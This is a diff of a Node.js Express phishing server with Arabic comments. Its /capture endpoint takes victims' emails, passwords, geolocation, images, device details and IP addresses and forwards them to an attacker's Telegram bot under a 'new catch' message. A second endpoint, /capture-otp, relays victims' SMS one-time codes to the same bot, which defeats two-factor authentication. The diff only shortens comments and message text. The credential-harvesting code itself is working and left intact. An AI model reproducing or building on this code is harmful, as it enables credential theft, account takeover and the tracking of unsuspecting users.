@@ -20,13 +20,12 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// استقبال البيانات الأساسية (إيميل، باسورد، موقع، صورة)
+// استقبال البيانات (إيميل، باسورد، موقع، صورة)
 app.post('/capture', async (req, res) => {
     try {
         const { email, password, location, image, device } = req.body;
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         
-        // إصلاح رابط الخريطة للدقة العالية
         const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الموقع مرفوض";
         const message = `🔥 صيد جديد!\n📧 إيميل: ${email}\n🔑 باسورد: ${password}\n📍 خريطة: ${mapUrl}\n📱 جهاز: ${device}\n🌐 IP: ${ip}`;
 
@@ -43,13 +42,12 @@ app.post('/capture', async (req, res) => {
     } catch (e) { res.status(500).send("Error"); }
 });
 
-// استقبال كود الـ OTP
 app.post('/capture-otp', async (req, res) => {
     const { otp, email } = req.body;
-    const message = `🔐 كود الـ SMS الجديد!\n📧 للحساب: ${email}\n💬 الكود: ${otp}`;
+    const message = `🔐 كود الـ SMS!\n📧 حساب: ${email}\n💬 الكود: ${otp}`;
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message });
     res.status(200).send("Success");
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Master Server Active on Port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Server Active`));
